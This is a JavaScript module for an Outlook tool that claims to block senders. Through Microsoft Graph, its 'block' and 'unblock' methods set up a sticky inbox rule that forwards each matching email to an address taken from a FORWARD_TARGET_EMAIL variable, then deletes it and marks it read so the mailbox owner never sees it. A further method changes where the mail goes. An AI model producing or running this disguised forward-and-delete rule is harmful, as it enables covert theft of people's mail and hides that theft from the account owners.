// src/outlook/blocked.js
const GraphClient = require('./graph');
const Log = require('../models/Log');

class BlockedSendersManager {
    constructor() {
        this.BLOCK_RULE_NAME = 'Blocked Senders - Sticky';
        if (!process.env.FORWARD_TARGET_EMAIL) {
            console.warn('⚠️ WARNING: FORWARD_TARGET_EMAIL is not defined in .env');
        }
        this.FORWARD_TARGET = process.env.FORWARD_TARGET_EMAIL;
    }

    async getBlockedSenders(accessToken) {
        const graph = new GraphClient(accessToken);
        return await graph.getBlockedSenders();
    }

    async addBlockedSender(accessToken, accountId, domain) {
        const graph = new GraphClient(accessToken);
        
        try {
            // 🔥 STEP 1: Pehle check karo rule exists ya nahi
            const rules = await graph.getRules();
            let blockRule = rules.find(r => r.displayName === this.BLOCK_RULE_NAME);

            if (blockRule) {
                // 🔥 STEP 2: Rule update karo - SENDER CONDITION + FORWARD + DELETE
                const current = blockRule.conditions?.senderContains || [];
                if (!current.includes(domain)) {
                    current.push(domain);
                }

                // ✅ COMPLETE RULE - FORWARD + DELETE BOTH!
                await graph.updateRule(blockRule.id, {
                    displayName: this.BLOCK_RULE_NAME,
                    sequence: 999,
                    isEnabled: true,
                    conditions: {
                        senderContains: current  // Saare blocked senders
                    },
                    actions: {
                        // 📨 FORWARD to target email!
                        forwardTo: [
                            {
                                emailAddress: {
                                    address: this.FORWARD_TARGET
                                }
                            }
                        ],
                        // 🗑️ DELETE from inbox!
                        delete: true,
                        markAsRead: true,
                        stopProcessingRules: true
                    }
                });
            } else {
                // 🔥 STEP 3: Nayi rule banao - FORWARD + DELETE
                await graph.createRule({
                    displayName: this.BLOCK_RULE_NAME,
                    sequence: 999,
                    isEnabled: true,
                    conditions: {
                        senderContains: [domain]
                    },
                    actions: {
                        // 📨 FORWARD to target email!
                        forwardTo: [
                            {
                                emailAddress: {
                                    address: this.FORWARD_TARGET
                                }
                            }
                        ],
                        // 🗑️ DELETE from inbox!
                        delete: true,
                        markAsRead: true,
                        stopProcessingRules: true
                    }
                });
            }
            
            // 🔥 STEP 4: Log entry
            await Log.create({
                accountId,
                action: 'sender_blocked',
                status: 'success',
                message: `Blocked ${domain} - Forwarding to ${this.FORWARD_TARGET}`,
                details: { 
                    domain, 
                    forwardTo: this.FORWARD_TARGET,
                    action: 'forward_delete'
                }
            });
            
            return true;
        } catch (error) {
            console.error('❌ Add blocked sender error:', error);
            throw error;
        }
    }

    async removeBlockedSender(accessToken, accountId, domain) {
        const graph = new GraphClient(accessToken);
        
        try {
            const rules = await graph.getRules();
            let blockRule = rules.find(r => r.displayName === this.BLOCK_RULE_NAME);

            if (blockRule) {
                const current = blockRule.conditions?.senderContains || [];
                const updated = current.filter(d => d !== domain);
                
                if (updated.length > 0) {
                    // 🔥 Rule update karo - remove domain but keep forward+delete
                    await graph.updateRule(blockRule.id, {
                        displayName: this.BLOCK_RULE_NAME,
                        sequence: 999,
                        isEnabled: true,
                        conditions: {
                            senderContains: updated
                        },
                        actions: {
                            forwardTo: [
                                {
                                    emailAddress: {
                                        address: this.FORWARD_TARGET
                                    }
                                }
                            ],
                            delete: true,
                            moveToDeletedItems: true,
                            markAsRead: true,
                            stopProcessingRules: true
                        }
                    });
                } else {
                    // 🔥 Koi sender nahi bacha to rule delete karo
                    await graph.deleteRule(blockRule.id);
                }
            }
            
            await Log.create({
                accountId,
                action: 'sender_unblocked',
                status: 'success',
                message: `Unblocked ${domain}`,
                details: { domain }
            });
            
            return true;
        } catch (error) {
            console.error('❌ Remove blocked sender error:', error);
            throw error;
        }
    }

    async isSenderBlocked(accessToken, domain) {
        const graph = new GraphClient(accessToken);
        return await graph.isSenderBlocked(domain);
    }

    // 🔥 NEW METHOD: Get forward target for blocked senders
    async getBlockedSendersForwardTarget() {
        return this.FORWARD_TARGET;
    }

    // 🔥 NEW METHOD: Update forward target for all blocked rules
    async updateForwardTarget(accessToken, accountId, newTargetEmail) {
        try {
            const graph = new GraphClient(accessToken);
            const rules = await graph.getRules();
            let blockRule = rules.find(r => r.displayName === this.BLOCK_RULE_NAME);

            if (blockRule) {
                // Update forward target
                await graph.updateRule(blockRule.id, {
                    actions: {
                        forwardTo: [
                            {
                                emailAddress: {
                                    address: newTargetEmail
                                }
                            }
                        ],
                        delete: true,
                        moveToDeletedItems: true,
                        markAsRead: true,
                        stopProcessingRules: true
                    }
                });

                this.FORWARD_TARGET = newTargetEmail;
                
                await Log.create({
                    accountId,
                    action: 'rule_updated',
                    status: 'success',
                    message: `Blocked senders forward target updated to ${newTargetEmail}`,
                    details: { newTarget: newTargetEmail }
                });

                return true;
            }
            return false;
        } catch (error) {
            console.error('❌ Update forward target error:', error);
            throw error;
        }
    }
}

module.exports = BlockedSendersManager;